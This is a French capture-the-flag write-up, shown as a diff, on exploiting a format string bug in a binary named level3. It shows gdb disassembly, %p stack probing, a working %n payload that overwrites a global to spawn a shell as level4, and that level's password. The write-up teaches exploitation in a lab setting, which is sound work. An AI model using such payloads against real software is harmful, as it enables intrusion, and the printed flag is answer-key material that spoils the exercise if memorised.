@@ -1,0 +1,49 @@
+Ce programme nous renvoi aussi la même chose qu’on lui envoi sur le stdin si on l’exécute.
+
+On lance gdb : en faisant info function on voit qu’il y a 2 fonctions : v et main, main appelle juste 
+v.
+v lui fait des appels à fgets, à system et printf.
+Contrairement à gets, fgets n’est pas vulnérable au buffer overflow.
+
+En regardant de plus près avec gdb on remarque que ces lignes sont intéressantes : 
+
+0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+0x080484da <+54>:	mov    0x804988c,%eax
+0x080484df <+59>:	cmp    $0x40,%eax
+0x080484e2 <+62>:	jne    0x8048518 <v+116>
+
+En effet juste après le call de printf on remarque que la valeur d’eax (qui était contenue dans la variable globale <m>) est comparée à 0x40 (64), il y a ensuite un jump à l’instruction d’après.
+On se doute donc que la valeur de retour du printf est celle qui est comparée avec 64.
+
+En faisant quelques recherches on apprend qu’il existe une vulnérabilité dans printf avec le %n qu’on 
+appelle le “format string exploit”.
+Pour résumer : la vulnérabilité apparait quand vous passez en argument de la fonction printf (ou 
+n'importe qu'elle fonction de cette famille d'ailleur) un pointeur sur chaine (comme argv[1]). Tous les 
+modifier présents dans votre chaine seront interprété par printf et substitué par leur valeurs qui, en 
+situation normale, ont aussi été passées en argument de la fonction et doivent donc se situer sur la 
+pile actuelle.
+
+On peut essayer : si on envoi %p %p %p %p %p au programme on reçoit : 0x200 0xb7fd1ac0 0xb7ff37d0 
+0x25207025 0x70252070.
+
+Avec le modifier %n on sait qu’on peut écrire n’importe où sur la stack. Dans notre cas ce sera sur 
+l’adresse de la valeur qui est copiée dans eax : 0x804988c
+
+Maintenant il faut trouver notre argument sur la stack : 
+- si on envoi : AAAA %p %p %p %p %p %p
+- le programme nous renvoi : AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025
+
+on se rend compte que notre argument se situe à l’offset 4, si on lui envoi AAAA %4$p il nous renvoi 
+bien AAAA 0x41414141.
+
+Il suffit maintenant d’envoyer ce qu’il faut à l’adresse au dessus pour écraser la mémoire, skip le 
+jump et spawn un shell avec le call system.
+
+Voilà le payload : python -c ‘print “\x8c\x98\x04\x08%60x%4$n”’ > /tmp/payload && cat /tmp/payload - | 
+./level3 
+
+Quand on le lance, il y a bien un shell qui spawn, un whoami nous dis bien qu’on est le user level4 on 
+peut donc récupérer le pass : 
+
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
